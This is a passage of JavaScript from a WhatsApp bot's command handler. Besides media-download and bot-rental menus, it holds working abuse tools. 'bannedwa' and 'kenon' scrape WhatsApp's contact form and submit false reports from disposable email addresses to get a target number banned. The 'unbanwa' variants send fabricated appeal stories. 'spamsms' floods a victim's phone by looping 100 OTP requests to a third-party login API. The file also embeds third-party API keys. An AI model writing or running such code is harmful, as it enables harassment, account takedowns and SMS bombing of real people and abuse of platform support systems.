  reply(mess.query.link)
const data = fetchJson(`https://api.lolhuman.xyz/api/snackvideo?apikey=efcb180d3fd3134748648887&url=${encodeURIComponent(text)}`)
const vidnya = data.result.url;
const cption = data.result.caption|| "nothing"
Dare.sendMessage(m.chat, { caption: cption, video: { url: vidnya } }, { quoted: m });
}
break
case 'ttaudio':
case 'tiktokaudio':{
if (!text) return replydare( `Example : ${prefix + command} link`)
reply(mess.wait);
const data = await fetchJson(`https://skizo.tech/api/tiktok?apikey=nanogembul&url=${encodeURIComponent(text)}`)
const audionya = data.data.music_info.play
Dare.sendMessage(m.chat, { audio: { url: audionya }, mimetype: 'audio/mp4' }, { quoted: m })
}
break

case 'ghstalk': case 'githubstalk':{
reply(mess.wait)
if (!q) return replydare(`Example ${prefix+command} YOO 𝐁𝐌𝐁`)
reply(mess.wait)
aj = await githubstalk.githubstalk(`${q}`)
Dare.sendMessage(m.chat, { image: { url : aj.profile_pic }, caption: 
`*/ Github Stalker \\*

Username : ${aj.username}
Nickname : ${aj.nickname}
Bio : ${aj.bio}
Id : ${aj.id}
Nodeid : ${aj.nodeId}
Url Profile : ${aj.profile_pic}
Url Github : ${aj.url}
Type : ${aj.type}
Admin : ${aj.admin}
Company : ${aj.company}
Blog : ${aj.blog}
Location : ${aj.location}
Email : ${aj.email}
Public Repo : ${aj.public_repo}
Public Gists : ${aj.public_gists}
Followers : ${aj.followers}
Following : ${aj.following}
Created At : ${aj.ceated_at}
Updated At : ${aj.updated_at}` }, { quoted: m } )
}
break

case 'unbanwa': {
if (!DareTheCreator) return reply(mess.only.owner)
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return reply(`Can't verify My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/?subject=messenger")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=199999999999999999995777678776668876677777")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `To: WhatsApp Developers

I am quite a famous musician, I have a very busy performance schedule this month. However, you have blocked my WhatsApp permanently, in my WhatsApp there is important data for my performance tomorrow. So please unblock my number now ${target} otherwise I will be complained and insulted by my fans`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
replydare(`Wait 1-24 hours for the unbanned process from the bot and wait ±30 seconds to see the email reply from WhatsApp sir Hw Mods  🙏`)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
replydare(`##- WhatsApp Support -##

Hello,

Thank you for contacting us.

Our system flags your account activity as a violation of our Terms of Service and blocks your phone number. We really appreciate you as a user. We apologize for any confusion or inconvenience caused by this issue.

We have removed the block after reviewing your account activity. You should now have access to WhatsApp.

As a next step, we recommend re-registering your phone number on WhatsApp to ensure you have access. You can visit our website to

download WhatsApp or the WhatsApp Business application.`)
} else if (payload.includes(`"payload":false`)) {
replydare(`##- WhatsApp Support -##

Thank you for contacting us. We will contact you back by email, and that may take up to three business days.`)
} else replydare(util.format(res.data))
} catch (err) {replydare(`${err}`)}
} else replydare('Enter target number!')
}
break




case 'unbanwav2': {
if (!DareTheCreator) return reply(mess.only.owner)
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return replydare(`Can't verify My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=199999999999999999995777678776668876677777")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Dear WhatsApp, we ask for your immediate assistance
[${targetnya}]
I have sent several emails and reports to WhatsApp to submit an appeal so that my number is quickly removed from the blocked list. I really need it for personal purposes to communicate with my family. If I have committed a previous violation then I will use my number more carefully and better than before and I have now complied with what WhatsApp suggested, and I really hope that now my number can be used again. Thank You`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
replydare(`Wait 1-24 hours for the unbanned process from the bot and wait ±30 seconds to see the email reply from WhatsApp sir Hw Mods🥺🙏`)

let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
replydare(`##- WhatsApp Support -##

Hello,

Thank you for contacting us.

Our system flags your account activity as a violation of our Terms of Service and blocks your phone number. We really appreciate you as a user. We apologize for any confusion or inconvenience caused by this issue.

We have removed the block after reviewing your account activity. You should now have access to WhatsApp.

As a next step, we recommend re-registering your phone number on WhatsApp to ensure you have access. You can visit our website to

download WhatsApp or the WhatsApp Business application.`)
} else if (payload.includes(`"payload":false`)) {
replydare(`##- WhatsApp Support -##

Thank you for contacting us. We will contact you back by email, and that may take up to three business days.`)
} else replydare(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else replydare('Enter target number!')
}
break


case 'unbanwav3': {
if (!DareTheCreator) return reply(mess.only.owner)
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return replydare(`Can't verify My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=199999999999999999995777678776668876677777")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", ` Hello WhatsApp
Nowadays, some people have many effective ways to block user numbers and report them without any reason, in fact, I know the terms of service well and I follow them, but some hackers made a fake report to me and my number was blocked, unblock number ${targetnya}`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
replydare(`Wait 1-24 hours for the unbanned process from the bot and wait ±30 seconds to see the email reply from WhatsApp sir Hw Mods🥺🙏`)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
replydare(`##- WhatsApp Support -##

Hello,

Thank you for contacting us.

Our system flags your account activity as a violation of our Terms of Service and blocks your phone number. We really appreciate you as a user. We apologize for any confusion or inconvenience caused by this issue.

We have removed the block after reviewing your account activity. You should now have access to WhatsApp.

As a next step, we recommend re-registering your phone number on WhatsApp to ensure you have access. You can visit our website to

download WhatsApp or the WhatsApp Business application.`)
} else if (payload.includes(`"payload":false`)) {
replydare(`##- WhatsApp Support -##

Thank you for contacting us. We will contact you back by email, and that may take up to three business days.`)
} else replydare(util.format(res.data))
} catch (err) {replydare(`${err}`)}
} else replydare('Masukkan nomor target!')
}
break


case 'unbanwav4': {
if (!DareTheCreator) return reply(mess.only.owner)
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return replydare(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=199999999999999999995777678776668876677777")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", ` Good afternoon WhatsApp team. My WhatsApp account has been burned permanently, please I beg you to unblock it, I can't use any other number anymore. I don't know why it was burned but my friend suggested it because I use GB WhatsApp, and I don't know it's wrong. My number is [ ${targetnya} ]. Please WhatsApp team, help me unblock my account.
Thank You`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
replydare(`Wait 1-24 hours for the unbanned process from the bot and wait ±30 seconds to see the email reply from WhatsApp sir Hw Mods🥺🙏`)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
replydare(`##- WhatsApp Support -##

Hello,

Thank you for contacting us.

Our system flags your account activity as a violation of our Terms of Service and blocks your phone number. We really appreciate you as a user. We apologize for any confusion or inconvenience caused by this issue.

We have removed the block after reviewing your account activity. You should now have access to WhatsApp.

As a next step, we recommend re-registering your phone number on WhatsApp to ensure you have access. You can visit our website to

download WhatsApp or the WhatsApp Business application.`)
} else if (payload.includes(`"payload":false`)) {
replydare(`##- WhatsApp Support -##

Thank you for contacting us. We will contact you back by email, and that may take up to three business days.`)
} else replydare(util.format(res.data))
} catch (err) {replydare(`${err}`)}
} else replydare('Enter target number!')
}
break
//=================================================
case 'unbanwav5': {
if (!DareTheCreator) return reply(mess.only.owner)
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return reply(`Can't verify My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=199999999999999999995777678776668876677777")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", ` Hello WhatsApp, my number has been stolen by hackers, please unlock it [${targetnya}]`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
replydare(`Wait 1-24 hours for the unbanned process from the bot and wait ±30 seconds to see the email reply from WhatsApp sir Hw Mods🥺🙏`)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
replydare(`##- WhatsApp Support -##

Hello,

Thank you for contacting us.

Our system flags your account activity as a violation of our Terms of Service and blocks your phone number. We really appreciate you as a user. We apologize for any confusion or inconvenience caused by this issue.

We have removed the block after reviewing your account activity. You should now have access to WhatsApp.

As a next step, we recommend re-registering your phone number on WhatsApp to ensure you have access. You can visit our website to

download WhatsApp or the WhatsApp Business application.`)
} else if (payload.includes(`"payload":false`)) {
replydare(`##- WhatsApp Support -##

Thank you for contacting us. We will contact you back by email, and that may take up to three business days.`)
} else replydare(util.format(res.data))
} catch (err) {replydare(`${err}`)}
} else replydare('Enter target number!')
}
break
//=================================================



case 'bannedwa': {
if (!DareTheCreator) return reply(mess.only.owner)
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return replydare(`Can't verify My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", ` I noticed there was a user using a modified whatsapp, so I asked support to block this account because it violates the terms of service, and the account uses a WhatsApp bot that can send malicious messages so that other users' WhatsApp cannot work.
Nomor : +${targetnya}`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
replydare(`Wait 1-24 hours for the bot ban process and wait ± 30 seconds to see the email reply from WhatsApp sir Hw Mods🥺🙏`)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
replydare(`##- WhatsApp Support -##

It looks like you are using or asking a question about an unofficial version of WhatsApp.

To ensure you have access to WhatsApp, re-verify your phone number using our official app which can be downloaded from our website: www.whatsapp.com/download

Unofficial apps compromise your security and safety, and we do not support them.

Here's what might happen if you use it:

There is no guarantee that your messages or data such as your location or files you share will be private and secure.

Accounts may be blocked due to use of unauthorized WhatsApp applications contrary to our Terms of Service.

Following are WhatsApp's terms of service:

WhatsApp Terms of Service

1. Application Usage

You agree to use the WhatsApp application ("Application") only for lawful purposes and in accordance with applicable law. You are not permitted to use the Application for illegal purposes or to violate third party rights. You also agree not to use the Application to send, receive, or store information that violates the law or violates third party rights.

2. Copyright and Trademark

You agree that all copyrights, trademarks and other proprietary rights related to the Application are owned by WhatsApp, Inc. and/or its affiliates. You are not permitted to use or modify any copyright, trademark or other proprietary rights without the written permission of WhatsApp, Inc. or its affiliates.

3. Data Privacy and Security
WhatsApp promises to protect your privacy and data security. We will process your data in accordance with our Privacy Policy which can be accessed at https://www.whatsapp.com/legal/#privacy-policy. By using the Application, you agree to our Privacy Policy and provide your consent to process your data in accordance with our Privacy Policy. 

4. Limitation of Liability 
WhatsApp is not responsible for any losses caused by the use of the Application by you or other third parties, including but not limited to losses caused by technical failure or equipment damage, data loss, property damage, or other financial losses. 

5. Changes to Terms of Service 
WhatsApp reserves the right to change these Terms of Service at any time without prior notice. By continuing to use the Application after changes to these Terms of Service become effective, you agree to be bound by the most current version of these Terms of Service.`)
} else if (payload.includes(`"payload":false`)) {
replydare(`##- WhatsApp Support -##

Thank you for contacting us. We will contact you back by email, and that may take up to three business days.`)
} else replydare(util.format(res.data))
} catch (err) {replydare(`${err}`)}
} else replydare('Enter target number!')
}
break
//=================================================
case 'sewa':
      case 'sewabot':
        {
          let eek = m.sender;
          Dare.sendMessage(m.chat, {
            'react': {
              'text': '⏳',
              'key': m.key
            }
          });
          let pesan = "*𝐒𝐀𝐋𝐀𝐌 𝐒𝐈𝐑 " + pushname + " " + nanoliatwaktu + "*\n*Want to rent a boat? Just select it in the rental list section ≧﹏≦*\n";
          let msg = generateWAMessageFromContent(from, {
            'viewOnceMessage': {
              'message': {
                'messageContextInfo': {
                  'deviceListMetadata': {},
                  'deviceListMetadataVersion': 0x2
                },
                'interactiveMessage': proto.Message.InteractiveMessage.create({
                  'body': proto.Message.InteractiveMessage.Body.create({
                    'text': pesan
                  }),
                  'footer': proto.Message.InteractiveMessage.Footer.create({
                    'text': "Legit things bro  " + wagc + "\n" + wm
                  }),
                  'header': proto.Message.InteractiveMessage.Header.create({
                    ...(await prepareWAMessageMedia({
                      'image': fs.readFileSync('./data/image/thumb.jpg')
                    }, {
                      'upload': Dare.waUploadToServer
                    })),
                    'title': '',
                    'gifPlayback': true,
                    'subtitle': ownername,
                    'hasMediaAttachment': false
                  }),
                  'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    'buttons': [{
                      'name': 'single_select',
                      'buttonParamsJson': "{\"title\":\"RENTAL LIST\",\n\"sections\":[{\"title\":\"CHOOSE WHICH PACKAGE YOU WANT TO BUY\",\n\"rows\":[{\"header\":\"🥉BRONZE PACKAGE🥉\",\n\"title\":\"Click Here!!\",\n\"description\":\"Buy package Bronze\",\n\"id\":\"" + prefix + "bronzepackage\"},\n{\"header\":\"🥈REGULER PACKAGE🥈\",\n\"title\":\"Click Here!!\",\n\"description\":\"Buy package regular\",\n\"id\":\"" + prefix + "regulerpaket\"},\n{\"header\":\"🏆UNLIMITED PACKAGE🏆\",\n\"title\":\"Click Here!!\",\n\"description\":\"Buy paket Unli\",\n\"id\":\"" + prefix + "unlipaket\"}]\n}]\n}"
                    }, {
                      'name': 'quick_reply',
                      'buttonParamsJson': "{\"display_text\":\"PAYMENT💰\",\"id\":\"" + prefix + "pay\"}"
                    }, {
                      'name': 'quick_reply',
                      'buttonParamsJson': "{\"display_text\":\"OWNER👥\",\"id\":\"" + prefix + "owner\"}"
                    }]
                  })
                })
              }
            }
          }, {
            'userJid': from,
            'quoted': m
          });
          await Dare.relayMessage(msg.key.remoteJid, msg.message, {
            'messageId': msg.key.id
          });
        }
        break;
      case 'bronzepackage':
{
  let list = "*`🥉BRONZE PACKAGE🥉`*\n\n*⛩️Purchase info*\n> Name: " + pushname + "\n> Package: Bronze\n\n*⛩️Bronze Package List*\n> 1k = 3 Days\n> 1500 = 1 Week\n> 2500 = 3 Weeks\n*⛩️Benefits of Bot Rental:*\n> Keep Group\n> Fun Games\n> Antilink other GC\n> AntiPromotion\n\n*🏮To do For payment please contact the owner or use the button below*\n";
  
  let msg = generateWAMessageFromContent(from, {
    'viewOnceMessage': {
      'message': {
        'messageContextInfo': {
          'deviceListMetadata': {},
          'deviceListMetadataVersion': 0x2
        },
        'interactiveMessage': proto.Message.InteractiveMessage.create({
          'body': proto.Message.InteractiveMessage.Body.create({
            'text': list
          }),
          'footer': proto.Message.InteractiveMessage.Footer.create({
            'text': "🚩Yoo bro everything it legit bro check channel too\n> " + global.instagram + "\n> " + wagc + "\n" + wm
          }),
           'header': proto.Message.InteractiveMessage.Header.create({
                    ...(await prepareWAMessageMedia({
                      'image': fs.readFileSync('./data/image/thumb.jpg')
                    }, {
                      'upload': Dare.waUploadToServer
                    })),
            'title': '',
            'gifPlayback': true,
            'subtitle': ownername,
            'hasMediaAttachment': false
          }),
          'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
            'buttons': [{
              'name': 'quick_reply',
              'buttonParamsJson': "{\"display_text\":\"PAYMENT💰\",\"id\":\"" + prefix + "pay\"}"
            }, {
              'name': 'quick_reply',
              'buttonParamsJson': "{\"display_text\":\"OWNER👥\",\"id\":\"" + prefix + "owner\"}"
            }]
          })
        })
      }
    }
  }, {
    'userJid': from,
    'quoted': m
  });
  await Dare.relayMessage(msg.key.remoteJid, msg.message, {
    'messageId': msg.key.id
  });
}
break;
      case 'regulerpaket':
        {
          let list = "*`🥈REGULAR PACKAGE 🥈`*\n\n*⛩️Purchase info*\n> Name: " + pushname + "\n> Package: Regular \n*⛩️Regular Package List*\n> 3K = 1 Month\n> 6K = 2 Months\n> 7Kk = 2 Months 7 Days \n*⛩️Benefits of Bot Rental:*\n> Keep Group\n> Fun Games\n> Antilink other GC\n> Anti-Promotion\n> Request Features\n> Admin Gets Premium\n> Cool Welcome\n\n*🏮To make payment please contact the owner or use the button below*\n";
          let msg = generateWAMessageFromContent(from, {
            'viewOnceMessage': {
              'message': {
                'messageContextInfo': {
                  'deviceListMetadata': {},
                  'deviceListMetadataVersion': 0x2
                },
                'interactiveMessage': proto.Message.InteractiveMessage.create({
                  'body': proto.Message.InteractiveMessage.Body.create({
                    'text': list
                  }),
                  'footer': proto.Message.InteractiveMessage.Footer.create({
                    'text': "🚩Yoo bro everything it legit bro check channel too\n> " + botscript + "\n> " + wagc + "\n" + wm
                  }),
 'header': proto.Message.InteractiveMessage.Header.create({
                    ...(await prepareWAMessageMedia({
                      'image': fs.readFileSync('./data/image/thumb.jpg')
                    }, {
                      'upload': Dare.waUploadToServer
                    })),
                    'title': '',
                    'gifPlayback': true,
                    'subtitle': ownername,
                    'hasMediaAttachment': false
                  }),
                  'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    'buttons': [{
                      'name': 'quick_reply',
                      'buttonParamsJson': "{\"display_text\":\"PAYMENT💰\",\"id\":\"" + prefix + "pay\"}"
                    }, {
                      'name': 'quick_reply',
                      'buttonParamsJson': "{\"display_text\":\"OWNER👥\",\"id\":\"" + prefix + "owner\"}"
                    }]
                  })
                })
              }
            }
          }, {
            'userJid': from,
            'quoted': m
          });
          await Dare.relayMessage(msg.key.remoteJid, msg.message, {
            'messageId': msg.key.id
          });
        }
        break;
      case 'unlipaket':
        {
          let list = "*`🏆UNLIMITED PACKAGE 🏆`*\n\n*⛩️Purchase info*\n> Name: " + pushname + "\n> Package: Unlimited \n*⛩️Unlimited Package Price*\n> 10k = Permanent\n> 20k = Permanent + Premium\n*⛩️Benefits of Renting a Bot:*\n> Maintain Group\n> Fun Games\n> Antilink other GC\n> Anti-Promotion\n> Feature Request\n> Admin Gets Premium\n> Cool Welcome\ n> Unlimited Limit\n> Unlock All Features\n> Get Updates Faster\n\n*🏮To make a payment please contact the owner or use the button below*\n";
          let msg = generateWAMessageFromContent(from, {
            'viewOnceMessage': {
              'message': {
                'messageContextInfo': {
                  'deviceListMetadata': {},
                  'deviceListMetadataVersion': 0x2
                },
                'interactiveMessage': proto.Message.InteractiveMessage.create({
                  'body': proto.Message.InteractiveMessage.Body.create({
                    'text': list
                  }),
                  'footer': proto.Message.InteractiveMessage.Footer.create({
                    'text': "🚩Yoo bro everything it legit bro check channel too\n> " + botscript + "\n> " + wagc + "\n" + wm
                  }),
 'header': proto.Message.InteractiveMessage.Header.create({
                    ...(await prepareWAMessageMedia({
                      'image': fs.readFileSync('./data/image/thumb.jpg')
                    }, {
                      'upload': Dare.waUploadToServer
                    })),
                    'title': '',
                    'gifPlayback': true,
                    'subtitle': ownername,
                    'hasMediaAttachment': false
                  }),
                  'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    'buttons': [{
                      'name': 'quick_reply',
                      'buttonParamsJson': "{\"display_text\":\"PAYMENT💰\",\"id\":\"" + prefix + "pay\"}"
                    }, {
                      'name': 'quick_reply',
                      'buttonParamsJson': "{\"display_text\":\"OWNER👥\",\"id\":\"" + prefix + "owner\"}"
                    }]
                  })
                })
              }
            }
          }, {
            'userJid': from,
            'quoted': m
          });
          await Dare.relayMessage(msg.key.remoteJid, msg.message, {
            'messageId': msg.key.id
          });
        }
        break
//=================================================
case 'spamsms': {
if (!DareTheCreator) return reply(mess.only.owner)
const froms = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (m.quoted || text) {
if (froms.startsWith('08')) return reply('Start the number with +234')
if (froms == owner) return reply('Cant spam this number!')
let nosms = '+' + froms.replace('@s.whatsapp.net', '')
let mal = ["Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v7108827108815046027 t6205049005192687891", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1692361810532096513 t9071033982482470646", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v4466439914708508420 t8068951106021062059", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v8880767681151577953 t8052286838287810618", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v6215776200348075665 t6662866128547677118", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1588190262877692089 t2919217341348717815", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v5330150654511677032 t9071033982482470646", "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36"]
let ua = mal[Math.floor(Math.random() * mal.length)];
let axios = require('axios').default;
let hd = {
'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
};
const dat = {
'phone': nosms
};
for (let x = 0; x < 100; x++) {
axios.post('https://api.myfave.com/api/fave/v1/auth', dat, {
headers: hd
}).then(res => {
console.log(res);
}).catch(err => {
console.log(`[${new Date().toLocaleTimeString()}] Spam (SMS) BY HW MODS WA MODS`);
});
}
} else reply(`Use of spam SMS number/reply target message*\nExample spam SMS +234xxxxx`)
m.reply(`SMS/call spam will be sent to the target number`)
}
break
//================================================\\
case 'kenon': {
if (!DareTheCreator) return reply(mess.only.owner)
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return replydare(`Can't verify My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", ` I noticed a user was using a modified whatsapp, so I asked support to block this account because it violates the terms of service, and the account uses a WhatsApp bot that can send malicious messages so that other users' WhatsApp cannot work.
Number : +${targetnya}`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
replydare(`Wait 1-24 hours for the bot ban process and wait ± 30 seconds to see the email reply from WhatsApp sir Hw Mods🥺🙏`)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
